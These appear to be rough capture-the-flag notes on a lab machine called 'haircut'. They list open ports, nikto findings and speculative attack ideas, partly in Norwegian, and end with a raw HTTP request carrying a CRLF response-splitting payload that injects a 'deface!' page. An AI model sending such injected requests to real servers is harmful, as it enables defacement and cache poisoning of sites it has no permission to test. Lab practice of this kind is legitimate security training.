## haircut 10.10.10.24

80/tcp open  http    nginx 1.10.0 \(Ubuntu\)

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 \(Ubuntu Linux; protocol 2.0\)

[http://10.10.10.24/uploads/](http://10.10.10.24/uploads/) 403 forbidden

* Server: nginx/1.10.0 \(Ubuntu\)

* Server leaks inodes via ETags, header found with file /, fields: 0x59198410 0x90

[http://10.10.10.24/test.htm](http://10.10.10.24/test.htm)l :D nikto

ingenting i bildet. kanskje noe med curl?

cache poisoning?

http splitting?

GET /test.html?site=%0d%0aContent-

Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-

Modified:%20Mon,%2027%20Oct%202017%2014:50:18%20GMT%0d%0aConte

nt-Length:%2020%0d%0aContent-

Type:%20text/html%0d%0a%0d%0a&lt;html&gt;deface!&lt;/html&gt; HTTP/1.1

Host: 10.10.10.24

User-Agent: Mozilla/5.0 \(X11; Linux x86\_64; rv:45.0\) Gecko/20100101 Firefox/45.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language: en-US,en;q=0.5

Connection: close

If-Modified-Since: Mon, 15 May 2017 10:28:48 GMT

If-None-Match: "591982e0-df"

